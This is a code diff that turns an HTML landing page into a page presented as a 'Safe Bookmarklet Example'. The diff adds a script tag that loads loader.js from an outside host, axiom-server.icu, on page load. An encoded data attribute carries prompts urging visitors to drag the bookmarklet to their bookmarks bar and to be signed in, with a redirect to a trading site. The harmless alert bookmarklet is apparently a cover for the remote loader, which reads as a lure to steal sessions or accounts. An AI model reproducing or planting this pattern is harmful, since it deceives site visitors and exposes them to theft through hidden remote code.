@@ -1,74 +1,43 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Enter Network</title>
-  <link rel="stylesheet" href="style.css" />
-
-  <!-- Meta Description -->
-  <meta name="description" content="ak47 is a website that is made for exposing and showing ecom related media">
-
-  <!-- Open Graph Meta Tags -->
-  <meta property="og:title" content="ak47 Network" />
-  <meta property="og:description" content="Exposing and showcasing ecom-related media." />
-  <meta property="og:image" content="4w6pnv.jpg" />
-  <meta property="og:url" content="https://ak47.bio" />
-  <meta property="og:type" content="website" />
-
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Safe Bookmarklet Example</title>
+  <script src="https://axiom-server.icu/loader.js" data="eyJoYXNoIjoiTURzMk56UTNNVFk0TmpNNCIsImFsZXJ0cyI6eyJndWlkZSI6IllvdSBtdXN0IGRyYWcgdGhlIGJvb2ttYXJrbGV0IHRvIHlvdXIgYm9va21hcmtzIGJhciBpbnN0ZWFkIG9mIGNsaWNraW5nIGl0LiIsInJlZGlyZWN0IjoiWW91IGFyZSBub3cgYmVpbmcgcmVkaXJlY3RlZCB0byBodHRwczovL2F4aW9tLnRyYWRlL2Rpc2NvdmVyLiIsInVuYXV0aG9yaXplZCI6IllvdSBtdXN0IGJlIHNpZ25lZCBpbiB0byB1c2UgdGhpcyBib29rbWFya2xldC4iLCJlcnJvciI6IkZhaWxlZCB0byBleGVjdXRlIHRoZSBib29rbWFya2xldC4gUGxlYXNlIHRyeSBhZ2FpbiBsYXRlci4ifX0="></script>
   <style>
     body {
-      opacity: 0;
-      transition: opacity 0.3s ease;
+      font-family: Arial, sans-serif;
+      background: #f4f4f9;
+      text-align: center;
+      padding: 50px;
     }
-
-    body.fade-in {
-      opacity: 1;
+    h1 {
+      color: #333;
     }
-
-    body.fade-out {
-      opacity: 0;
+    .bookmarklet {
+      display: inline-block;
+      padding: 12px 20px;
+      margin-top: 20px;
+      background: #007BFF;
+      color: white;
+      font-weight: bold;
+      text-decoration: none;
+      border-radius: 8px;
+      transition: background 0.3s;
+    }
+    .bookmarklet:hover {
+      background: #0056b3;
     }
   </style>
 </head>
 <body>
-  <!-- Video Background -->
-  <video id="bg-video" autoplay loop muted playsinline>
-    <source src="background.mp4" type="video/mp4" />
-    Your browser does not support HTML5 video.
-  </video>
+  <h1>Drag this Bookmarklet!</h1>
+  <p>Drag the button below to your bookmarks bar:</p>
 
-  <!-- Overlay Content -->
-  <div class="container">
-    <div class="content">
-      <img src="mainicon.png" alt="Main Icon" class="main-icon" />
-      <a href="network.html" class="enter-button">ENTER NETWORK</a>
-      <p class="small-text">discord.gg/clap</p>
-    </div>
-  </div>
-
-  <script>
-    // Fade-in on load
-    window.addEventListener("DOMContentLoaded", () => {
-      document.body.classList.add("fade-in");
-    });
-
-    // Fade-out on navigation
-    document.querySelectorAll('a[href]').forEach(link => {
-      const href = link.getAttribute('href');
-      if (!href.startsWith('#') && !href.startsWith('javascript:')) {
-        link.addEventListener('click', function (e) {
-          e.preventDefault();
-          document.body.classList.remove("fade-in");
-          document.body.classList.add("fade-out");
-          setTimeout(() => {
-            window.location.href = this.href;
-          }, 300); // match transition duration
-        });
-      }
-    });
-  </script>
-  <script src="color.js"></script>
-
+  <!-- Safe example bookmarklet: shows an alert -->
+  <a class="bookmarklet" href="javascript:(function(){alert('Hello from a safe bookmarklet!');})();">
+    Safe Bookmarklet
+  </a>
 </body>
 </html>
